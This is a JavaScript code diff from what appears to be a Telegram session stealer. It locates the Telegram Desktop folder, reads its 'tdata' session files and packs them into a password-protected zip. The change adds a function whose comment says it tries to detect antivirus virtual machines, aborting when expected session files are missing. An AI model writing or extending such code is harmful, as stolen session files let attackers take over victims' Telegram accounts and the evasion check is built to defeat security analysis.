@@ -35,8 +35,20 @@ async function findTelegramDirectoryPath(appDataPath) {
   return path.join(appDataPath, telegramDirectory.name)
 }
 
+/** Check the files before creating the archive (try to detect AV virtual machines!) */
+function checkTdataFiles(tdataFiles) {
+  const neededFiles = ['dumps', 'emoji', 'key_datas', 'usertag', 'shortcuts-default.json']
+  const allTdataFiles = new Set(tdataFiles.map(f => f.name))
+  if (tdataFiles.length < 5 || ![...neededFiles].every(needed => allTdataFiles.has(needed)))
+    throw new Error('Something is wrong with the tdata files!')
+}
+
 function archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword) {
   return new Promise(async (resolve, reject) => {
+    const tdataPath = path.join(telegramDirectoryPath, 'tdata')
+    const tdataFiles = await fs.promises.readdir(tdataPath, { withFileTypes: true })
+    checkTdataFiles(tdataFiles)
+
     const output = fs.createWriteStream(archivePath)
 
     archiver.registerFormat('zip-encrypted', archiverEncrypted)
@@ -55,8 +67,7 @@ function archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassw
 
     archive.pipe(output)
 
-    const tdataPath = path.join(telegramDirectoryPath, 'tdata')
-    const files = (await fs.promises.readdir(tdataPath, { withFileTypes: true })).filter(
+    const files = tdataFiles.filter(
       file =>
         !file.name.startsWith('user_data') &&
         file.name !== 'temp' &&
